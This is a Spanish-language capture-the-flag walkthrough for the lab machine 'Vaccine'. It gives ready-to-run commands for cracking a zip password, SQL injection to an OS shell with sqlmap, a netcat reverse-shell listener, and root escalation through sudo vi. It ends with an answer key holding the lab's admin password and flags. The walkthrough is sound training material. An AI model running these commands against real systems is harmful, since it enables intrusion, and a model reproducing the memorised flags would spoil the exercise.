# Vaccine

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
*   **Tags:**&#x20;

    • **Vulnerability Assessment**: Evaluación sistemática para identificar y clasificar vulnerabilidades en sistemas, aplicaciones o redes.\
    • **Databases**: Repositorios estructurados de datos que pueden ser vulnerables a ataques como SQL injection.\
    • **Custom Applications**: Aplicaciones desarrolladas a medida que pueden contener vulnerabilidades específicas no presentes en aplicaciones comerciales.\
    • **Protocols**: Conjuntos de reglas que permiten la comunicación entre dispositivos, los cuales pueden ser explotados si contienen fallos.\
    • **Source Code Analysis**: Revisión del código fuente para identificar errores o vulnerabilidades de seguridad.\
    • **PostgreSQL**: Sistema de gestión de bases de datos que puede ser explotado mediante ataques como SQL injection.\
    • **FTP**: Protocolo de transferencia de archivos que puede exponer credenciales si no se implementa de manera segura.\
    • **Password Cracking**: Técnica de descifrado de contraseñas mediante ataques de fuerza bruta o diccionario.\
    • **SUDO Exploitation**: Aprovechamiento de configuraciones inseguras de SUDO para escalar privilegios en un sistema.\
    • **SQL Injection**: Inyección de código malicioso en consultas SQL para manipular bases de datos y extraer información.\
    • **Remote Code Execution**: Ejecución de código malicioso de manera remota en un sistema comprometido.\
    • **Clear Text Credentials**: Exposición de credenciales sin cifrado, lo que facilita su robo en tránsito.\
    • **Anonymous/Guest Access**: Permitir acceso sin autenticación o con credenciales por defecto, facilitando ataques.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.137.77
```

<figure><img src="../../../.gitbook/assets/image (616).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Linux** ya que su **ttl=63**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -p- --min-rate 5000 -sV 10.129.137.77
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../../.gitbook/assets/image (617).png" alt=""><figcaption></figcaption></figure>

### 4. 🚪 **Acceso Inicial**

Como podemos observar durante el escaneo que el **puerto 21** perteneciente al **servicio FTP,** el **puerto 22** perteneciente al **servicio SSH**  y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

Primero, accedemos a un servidor FTP utilizando el usuario `anonymous`. Esto nos permite descargar un archivo que probablemente está protegido con contraseña.

<figure><img src="../../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>

El archivo descargado está protegido con una contraseña. Por lo tanto, necesitamos una herramienta como **John the Ripper** para obtener dicha contraseña.

```bash
zip2john backup.zip > hash.txt
```

<figure><img src="../../../.gitbook/assets/image (619).png" alt=""><figcaption></figcaption></figure>

John the Ripper es una herramienta muy útil para romper contraseñas de archivos protegidos. Vamos a usarlo en conjunto con `zip2john`, que convierte el archivo comprimido en un formato que **John** pueda procesar.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<figure><img src="../../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>

Ahora que tenemos la contraseña, podemos descomprimir el archivo protegido.

<figure><img src="../../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>

Mostramos el contenido del archivo `index.php` en el que se nos indica el nombre del usuario y su contraseña aunque en formato **MD5**.

<figure><img src="../../../.gitbook/assets/image (623).png" alt=""><figcaption></figcaption></figure>

A través de esta página desciframos la contraseña [https://www.dcode.fr/funcion-hash-md5](https://www.dcode.fr/funcion-hash-md5)

<figure><img src="../../../.gitbook/assets/image (625).png" alt=""><figcaption></figcaption></figure>

Accedemos con las credenciales obtenidas en los pasos anteriores.

<figure><img src="../../../.gitbook/assets/image (622).png" alt=""><figcaption></figcaption></figure>

Obtenemos el valor de la cookie de cualquier coche.

<figure><img src="../../../.gitbook/assets/image (626).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (627).png" alt=""><figcaption></figcaption></figure>

```bash
sqlmap --url="http://10.129.137.77/dashboard.php?search=meta" --cookie="PHPSESSID=q9uc4eavt4kd65pgi5rc32jvgu" --os-shell
```

No hace falta probar más campos si hemos encontrado ya uno que no es ejecutable. Por lo que usamos una reverse shell.&#x20;

```bash
rlwrap nc -lvnp 443
```

<figure><img src="../../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

Tras conseguir la reverse shell y así poder acceder mostramos el contenido del fichero `dashboard.php` en el que se nos muestra un usuario y una contraseña.

<figure><img src="../../../.gitbook/assets/image (629).png" alt=""><figcaption></figcaption></figure>

### 5. 🔑 **Captura de la Flag**

Vemos que podemos usar **vi** con permisos de root. Accedemos al directorio `/var/lib/postgresql` en el que encontramos la flag del usuario.

<figure><img src="../../../.gitbook/assets/image (630).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (631).png" alt=""><figcaption></figcaption></figure>

Accedemos a través de **SSH** al usuario con sus credenciales.

```bash
ssh postgres@10.129.137.77
```

<figure><img src="../../../.gitbook/assets/image (632).png" alt=""><figcaption></figcaption></figure>

Debemos de modificar el archivo de configuración utilizando **vi**.

```bash
/bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Observamos está página [https://gtfobins.github.io/gtfobins/vi/](https://gtfobins.github.io/gtfobins/vi/). Una vez en **vi**, presiona **escape** y luego escribe `:!/bin/bash`.

<figure><img src="../../../.gitbook/assets/image (633).png" alt=""><figcaption></figcaption></figure>

Accedemos al directorio de root en el que contiene la bandera de root.

<figure><img src="../../../.gitbook/assets/image (634).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (635).png" alt=""><figcaption></figcaption></figure>

### 6. ❓Preguntas

#### Tarea 1: **Además de SSH y HTTP, ¿qué otro servicio está disponible en esta máquina?**

**FTP**

_Este servicio adicional disponible en el servidor es FTP, utilizado comúnmente para la transferencia de archivos._

#### Tarea 2: **Este servicio puede configurarse para permitir el inicio de sesión con cualquier contraseña para un usuario específico. ¿Cuál es ese nombre de usuario?**

**anonymous**

_El servicio FTP se puede configurar para permitir el acceso sin autenticación real para el usuario `anonymous`._

#### Tarea 3: **¿Cuál es el nombre del archivo descargado a través de este servicio?**

**backup.zip**

_Este archivo, `backup.zip`, fue descargado utilizando el servicio FTP y contiene datos potencialmente importantes._

#### Tarea 4: **¿Qué script viene con el conjunto de herramientas de John The Ripper y genera un hash de un archivo ZIP protegido con contraseña en un formato que permite intentos de descifrado?**

**zip2john**

_El script `zip2john` convierte el archivo ZIP protegido en un formato adecuado para que John The Ripper pueda intentar descifrar la contraseña._

#### Tarea 5: **¿Cuál es la contraseña del usuario admin en el sitio web?**

**qwerty789**

_La contraseña para el usuario administrador es `qwerty789`, y proporciona acceso a funciones administrativas en el sitio._

#### Tarea 6: **¿Qué opción se puede pasar a sqlmap para intentar obtener ejecución de comandos a través de la inyección SQL?**

**--os-shell**

_La opción `--os-shell` de `sqlmap` se utiliza para intentar obtener una shell a través de una vulnerabilidad de inyección SQL._

#### Tarea 7: **¿Qué programa puede ejecutar el usuario postgres como root usando sudo?**

**vi**

_El usuario `postgres` puede ejecutar el editor `vi` con privilegios de root mediante `sudo`, lo que podría permitir la escalada de privilegios._

#### Tarea 8: **Enviar bandera de usuario**

ec9b13ca4d6229cd5cc1e09980965bf7

#### Tarea 9: **Enviar bandera de root**

dd6e058e814260bc70e9bbdef2715849



